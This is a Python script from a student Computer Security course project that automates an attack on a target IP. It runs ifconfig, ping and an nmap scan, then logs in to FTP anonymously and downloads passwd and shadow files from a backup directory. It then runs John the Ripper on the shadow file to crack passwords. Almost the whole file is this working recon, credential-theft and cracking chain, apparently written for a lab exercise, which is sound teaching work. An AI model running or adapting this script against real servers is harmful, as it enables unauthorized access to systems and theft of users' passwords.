"""
myAutoCommand.py
Program Description: Project #2: 
Program Usage: python3 myAutoCommand.py <target_ip_address>

Group Members: Ian Holbrook & Cole Faulk
Date: 10/22/2026
Course: Computer Security (CSCI 3250)
"""

#needed libraries for the program
import subprocess
import ftplib
import sys
import os

#defined variables for the program for easy access
OutputFile = "outfile_csci3250.txt"
FTP_User = "anonymous"
FTP_Password = "anonymous@"


def run_command(cmd, output_file):
    """
        This function will run a given command and write the output to a file.
    
        Args:
           cmd (str): the command to be executed
           output_file (txt file): outfile_csci3250.txt
    
        """
    
    header = "\n$ " + cmd + "\n"
    print(header, end="")
    output_file.write(header)

    try:
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True,)
        out = result.stdout
    except Exception as e:
        out = f"Error executing command: {e}\n"

    print(out, end="")
    output_file.write(out)
    output_file.flush()  # Ensure the output is written to the file immediately


def ftp_commands(server, output_file):
    """
        This function will connect to the FTP server, list directories, and download files.
    
        Args:
           server (str): the target server address
           output_file (txt file): outfile_csci3250.txt
               
        """
    
    header = "\n--- FTP SESSION to "+server+" ---\n"
    print(header, end="")
    output_file.write(header)

    try:
        ftp = ftplib.FTP(server, timeout=15)
        login_message = ftp.login(FTP_User, FTP_Password)
        print(login_message)
        output_file.write(login_message + "\n")

        #list CD
        output_file.write("\nftp> ls\n")
        print("\nftp> ls")
        for item in ftp.nlst():
            print(item)
            output_file.write(item + "\n")

        #change to backup directory
        output_file.write("\nftp> cd backup\n")
        print("\nftp> cd backup")
        ftp.cwd("backup")

        #list backup directory
        output_file.write("\nftp> ls\n")
        print("\nftp> ls")
        for item in ftp.nlst():
            print(item)
            output_file.write(item + "\n")

        #download passwd
        output_file.write("\nftp> get passwd\n")
        print("\nftp> get passwd")
        with open("passwd", "wb") as f:
            ftp.retrbinary("RETR passwd", f.write)
        output_file.write("Downloaded passwd\n")

        #download shadow
        output_file.write("\nftp> get shadow\n")
        print("\nftp> get shadow")
        with open("shadow", "wb") as file:
            ftp.retrbinary("RETR shadow", file.write)
        output_file.write("Downloaded shadow\n")

        #close session
        ftp.quit()
        output_file.write("\nftp> bye\nFTP session closed.\n")
        print("\nftp> bye")
 
    except ftplib.all_errors as error:
        error_message = f"FTP error: {error}\n"
        print(error_message)
        output_file.write(error_message)

    output_file.flush()  


def main():
    """
        The main function will use the pre-defined functions to run commands and perform FTP operations on the target server.
               
        """

    if len(sys.argv) != 2:
        print("Use the syntax: python3 myAutoCommand.py <server_address>")
        sys.exit(1)

    server_address = sys.argv[1]

    with open(OutputFile, "w") as output_file:
        output_file.write("=== Automated Recon / Transfer Log ===\n")
        output_file.write(f"Target Server: {server_address}\n")

        run_command("ifconfig eth0", output_file)
        run_command("ping "+ server_address + " -c 4", output_file)
        run_command("nmap "+ server_address, output_file)    
        ftp_commands(server_address, output_file)
        run_command("tail passwd", output_file)
        run_command("tail shadow", output_file)
        run_command("john shadow", output_file)

    print(f"\nAll output saved to {OutputFile}")

if __name__ == "__main__":
    main()